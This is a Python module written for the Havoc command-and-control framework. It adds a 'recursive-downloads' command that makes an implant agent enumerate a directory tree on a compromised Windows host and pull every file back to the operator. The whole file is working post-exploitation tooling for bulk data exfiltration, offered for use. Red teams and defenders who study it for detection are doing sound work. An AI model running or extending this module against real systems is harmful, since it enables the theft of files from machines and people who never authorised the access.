import argparse
import pyhavoc

from os.path          import *
from pyhavoc.agent    import *
from pyhavoc.listener import *

@KnRegisterCommand(
    command     = 'recursive-downloads',
    description = 'recursively download files of a directory' )
class TaskRecursiveDownload( HcKaineCommand ):
    def __init__( self, *args, **kwargs ):
        super().__init__( *args, **kwargs )
        self.FILE_ATTRIBUTE_DIRECTORY = 0x00000010
        return

    @staticmethod
    def arguments( parser ):
        parser.add_argument( 'path', nargs='?', default='.\\*', type=str, help="path to recursively download" )
        parser.add_argument( '--depth', type=int, default=0, help="recursive directory depth to download" )
        return

    async def execute( self, args ):
        ls      = self.agent().command( 'ls' )
        task    = ls.list_directory( args.path, depth = args.depth )
        task_id = format( task.task_uuid(), 'x' )

        if args.path == '.\\*' or args.path == '.':
            self.log_task( task_id, f'list current working directory' )
        else:
            self.log_task( task_id, f'list directory files and folders: {args.path}' )

        try:
            directory, files = await task.result()
        except Exception as e:
            self.log_error( f"({task_id}) failed to list directory \"{args.path}\": {e}" )
            return

        self.log_success( f"({task_id}) successfully retrieved files, now issue downloads..." )

        paths, count = self.files_count( directory, files )
        self.log_info( f"downloading {count} files from {directory} base directory" )

        for path in paths:
            await self.agent().download_file( path, task_wait = False )

        return

    def files_count( self, path, files ) -> tuple[list[str], int]:
        process_dir = []
        count_files = 0
        file_paths  = []

        if not isinstance( files, list ):
            return [], 0

        for entry in files:
            file_type = "dir" if entry[ 'attribute' ] & self.FILE_ATTRIBUTE_DIRECTORY else "fil"

            if file_type == 'fil':
                count_files += 1

                _file_path = path
                if not _file_path.endswith( '\\' ):
                    _file_path += '\\'
                _file_path += entry[ 'file name' ]

                file_paths.append( _file_path )

            if 'files' in entry and file_type == 'dir':
                process_dir.append( entry )

        for entry in process_dir:
            _folder = path
            if not _folder.endswith( '\\' ):
                _folder += '\\'
            _folder += entry[ 'file name' ]

            _file_paths, _count_files = self.files_count( _folder, entry[ 'files' ] )

            file_paths  += _file_paths
            count_files += _count_files

        return file_paths, count_files

    def register_command( self, args ) -> bool:
        return self._check_registered()

    def _check_registered( self ) -> bool:
        ls = self.agent().command( 'ls' )
        if ls is None:
            return False

        #
        # check when ever it has been registered
        return ls.register_command( None )
